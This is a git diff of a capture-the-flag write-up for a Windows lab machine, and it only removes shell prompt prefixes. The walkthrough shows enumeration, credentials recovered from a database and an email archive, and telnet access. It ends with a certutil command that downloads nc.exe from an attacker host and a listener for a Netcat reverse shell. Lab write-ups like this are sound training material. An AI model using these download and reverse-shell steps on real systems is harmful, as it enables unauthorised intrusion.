@@ -8,7 +8,7 @@ tags: [ctf]
 
 ## Initial Enumeration
 ``` zsh
-$ sudo nmap -sC -sV -vv --top-ports=5000 $TARGETIP -oN nmapout
+sudo nmap -sC -sV -vv --top-ports=5000 $TARGETIP -oN nmapout
 ```
 
 ``` zsh
@@ -40,7 +40,7 @@ Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:mi
 ### FTP
 FTP is found to be open to anonymous access (anonymous / anypasswordcanbeused). 
 ``` zsh
-$ ftp $TARGETIP
+ftp $TARGETIP
 ```
 
 Within the FTP service, two folders are available with a single file in each.
@@ -98,14 +98,14 @@ mget Access Control.zip [anpqy?]? y
 
 Attempting to unzip the Access Control.zip file with the standard unzip command fails:
 ``` zsh
-$ unzip Access\ Control.zip 
+unzip Access\ Control.zip 
 Archive:  Access Control.zip
    skipping: Access Control.pst      unsupported compression method 99
 ```
 
 Using the 7z tool, it is revealed that the zip archive is password protected:
 ``` zsh
-$ 7z e Access\ Control.zip 
+7z e Access\ Control.zip 
 
 7-Zip 26.00 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-02-12
  64-bit locale=en_US.UTF-8 Threads:12 OPEN_MAX:1024, ASM
@@ -125,14 +125,14 @@ Enter password (will not be echoed):
 
 Since we don't have any passwords currently, let's pivot to the *backup.mdb* file. Being unfamiliar with the extension, we investigate what file type this is:
 ``` zsh
-$ file backup.mdb          
+file backup.mdb          
 backup.mdb: Microsoft Access Database
 ```
 
 With a quick search, we find that with the [mdbtools](https://www.kali.org/tools/mdbtools/) suite, these files can be read. Using some bash magic, we can dump all the tables into JSON output:
 
 ``` zsh
-$ for line in $(mdb-tables backup.mdb -1); do echo "TABLE: ${line}" ; mdb-json backup.mdb $line; done
+for line in $(mdb-tables backup.mdb -1); do echo "TABLE: ${line}" ; mdb-json backup.mdb $line; done
 ```
 
 Parsing through the output, we find credentials for an admin user:
@@ -155,7 +155,7 @@ Compressed: 10870
 
 This was successful, leaving us with a single file *Access Control.pst*.
 ``` zsh
-$ file Access\ Control.pst 
+file Access\ Control.pst 
 Access Control.pst: Microsoft Outlook Personal Storage (>=2003, Unicode, version 23), dwReserved1=0x234, dwReserved2=0x22f3a, bidUnused=0000000000000000, dwUnique=0x39, 271360 bytes, bCryptMethod=1, CRC32 0x744a1e2e
 ```
 
@@ -167,7 +167,7 @@ From Microsoft's documentation we can see this file type can contain various out
 
 This file can be read with the [pst-utils](https://www.kali.org/tools/mdbtools/) tool suite. We will use the **readpst** tool specifically.
 ``` zsh
-$ readpst Access\ Control.pst 
+readpst Access\ Control.pst 
 Opening PST file and indexes...
 Processing Folder "Deleted Items"
         "Access Control" - 2 items done, 0 items skipped.
@@ -175,7 +175,7 @@ Processing Folder "Deleted Items"
 
 This results in a file created with the .mbox extension, which is text based and can be read easily in the CLI.
 ``` zsh
-$ cat Access\ Control.mbox 
+cat Access\ Control.mbox 
 From "john@megacorp.com" Thu Aug 23 19:44:07 2018
 Status: RO
 From: john@megacorp.com <john@megacorp.com>
@@ -196,7 +196,7 @@ The password for the “security” account has been changed to 4Cc3ssC0ntr0ller
 With our credentials for the security account, we can now attempt to authenticate to the telnet service.
 
 ``` zsh
-$ telnet $TARGETIP         
+telnet $TARGETIP         
 Trying $TARGETIP...
 Connected to $TARGETIP.
 Escape character is '^]'.
@@ -300,7 +300,7 @@ L�F�@ ��7���7���#�P/P�O� �:i�+00�/C:\R1M�:Wind
 
 While we *can* just attempt to parse the readable information from this binary file type, tool suites such as **liblnk-utils** will allow us to better interpret this shortcut file:
 ``` zsh
-$ sudo apt install liblnk-utils -y
+sudo apt install liblnk-utils -y
 ```
 
 We will also need to get this file onto our attacker machine. Since we are limited to CMD currently, we can use the **certutil** command to encode the file to base64, and do a simple copy and paste.
@@ -354,7 +354,7 @@ NgAyADgALQA2ADMANAA0ADYAMgA1ADYALQA1ADAAMAAAAAAAAAAAAAAAAAAAAA==
 
 This can then be converted back to the .lnk file on our attacker machine, after removing the BEGIN and END certificate lines:
 ``` zsh
-$ echo -n 'TAAAAAEUAgAAAAAAwAAAAAAAAEb7QAAAIAAAAPV/wTcRBMoB9X/BNxEEygGg0wjv
+echo -n 'TAAAAAEUAgAAAAAAwAAAAAAAAEb7QAAAIAAAAPV/wTcRBMoB9X/BNxEEygGg0wjv
 IwTKAQBQAAAAAAAAAQAAAAAAAAAAAAAAAAAAAC8BFAAfUOBP0CDqOmkQotgIACsw
 MJ0ZAC9DOlwAAAAAAAAAAAAAAAAAAAAAAAAAUgAxAAAAAAAWTec6EABXaW5kb3dz
 ADwACAAEAO++7jqFGhZN5zoqAAAAdwEAAAAAAQAAAAAAAAAAAAAAAAAAAFcAaQBu
@@ -397,7 +397,7 @@ NgAyADgALQA2ADMANAA0ADYAMgA1ADYALQA1ADAAMAAAAAAAAAAAAAAAAAAAAA==' | base64 -d > 
 
 It can now be analyzed with the **lnkinfo** command:
 ``` zsh
-$ lnkinfo outlink.lnk 
+lnkinfo outlink.lnk 
 ```
 
 It contains quite a bit of output, but the Command line arguments are what we want to see specifically:
@@ -421,12 +421,12 @@ With confirmation the credential is indeed present, we can now leverage this to 
 
 We will download a Netcat executable to the machine, and create a reverse shell using the **-e** flag. First we have to get our hands on the **nc.exe**:
 ``` zsh
-$ git clone https://github.com/int0x33/nc.exe/ && cd nc.exe
+git clone https://github.com/int0x33/nc.exe/ && cd nc.exe
 ```
 
 We then need to serve this file to the machine, which can be done by setting up a simple python HTTP server, and leveraging the **certutil** command again:
 ``` zsh
-$ python -m http.server 80
+python -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
@@ -437,7 +437,7 @@ C:\Users\security> certutil -urlcache -split -f http://$ATTACKERIP/nc.exe C:\Use
 
 Now finally, we can setup the reverse shell listener:
 ``` zsh
-$ nc -lvnp 8888
+nc -lvnp 8888
 listening on [any] 8888 ...
 ```
 
